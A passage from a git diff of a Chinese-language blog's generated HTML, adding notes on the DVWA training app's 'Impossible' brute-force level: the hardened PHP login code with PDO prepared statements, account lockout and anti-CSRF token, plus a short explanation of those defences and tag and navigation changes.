class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</div><div class="line">$data-&gt;bindParam(<span class="string">':password'</span>,$pass,PDO::PARAM_STR);</div><div class="line">$data-&gt;execute();</div><div class="line">$row=$data-&gt;fetch();</div><div class="line"></div><div class="line"><span class="comment">//Ifitsavalidlogin...</span></div><div class="line"><span class="keyword">if</span>(($data-&gt;rowCount()==<span class="number">1</span>)&amp;&amp;($account_locked==<span class="keyword">false</span>))&#123;</div><div class="line"><span class="comment">//Getusersdetails</span></div><div class="line">$avatar=$row[<span class="string">'avatar'</span>];</div><div class="line">$failed_login=$row[<span class="string">'failed_login'</span>];</div><div class="line">$last_login=$row[<span class="string">'last_login'</span>];</div><div class="line"></div><div class="line"><span class="comment">//Loginsuccessful</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</div><div class="line"></div><div class="line"><span class="comment">//Hadtheaccountbeenlockedoutsincelastlogin?</span></div><div class="line"><span class="keyword">if</span>($failed_login&gt;=$total_failed_login)&#123;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;:Someonemightofbeenbruteforcingyouraccount.&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Numberofloginattempts:&lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br/&gt;Lastloginattemptwasat:&lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Resetbadlogincount</span></div><div class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETfailed_login="0"WHEREuser=(:user)LIMIT1;'</span>);</div><div class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</div><div class="line">$data-&gt;execute();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="comment">//Loginfailed</span></div><div class="line">sleep(rand(<span class="number">2</span>,<span class="number">4</span>));</div><div class="line"></div><div class="line"><span class="comment">//Givetheusersomefeedback</span></div><div class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;br/&gt;&lt;br/&gt;Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.&lt;br/&gt;Ifthisisthecase,&lt;em&gt;pleasetryagainin&#123;$lockout_time&#125;minutes&lt;/em&gt;.&lt;/pre&gt;"</span>;</div><div class="line"></div><div class="line"><span class="comment">//Updatebadlogincount</span></div><div class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;'</span>);</div><div class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</div><div class="line">$data-&gt;execute();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//Setthelastlogintime</span></div><div class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;'</span>);</div><div class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</div><div class="line">$data-&gt;execute();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//GenerateAnti-CSRFtoken</span></div><div class="line">generateSessionToken();</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
+<p>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
+<p><a href="http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html" target="_blank" rel="external">http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html</a></p>
 
       
 
@@ -237,7 +296,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">闲谈</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">MySql</a>
         		</li>
       		
 		</ul>
@@ -250,7 +313,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/闲谈/" class="article-tag-list-link color3">闲谈</a>
+        			<a href="/categories/PHP/" class="article-tag-list-link color4">PHP</a>
         		</li>
       		
 		</ul>
@@ -305,7 +368,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/04/07/各种鸡汤/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/02/dvwa学习总结/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -319,18 +382,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/04/07/git代码冲突的常见解决方法/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          git代码冲突常见的解决方法
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/04/07/pandas的介绍/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">python爬虫之数据分析包pandas</div>
+    <a href="/2017/08/02/PHP中MySQL，MySQLi和PDO的用法/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP中MySQL、MySQLi和PDO的用法和区别</div>
       <i class="icon-circle-right"></i>
     </a>
   
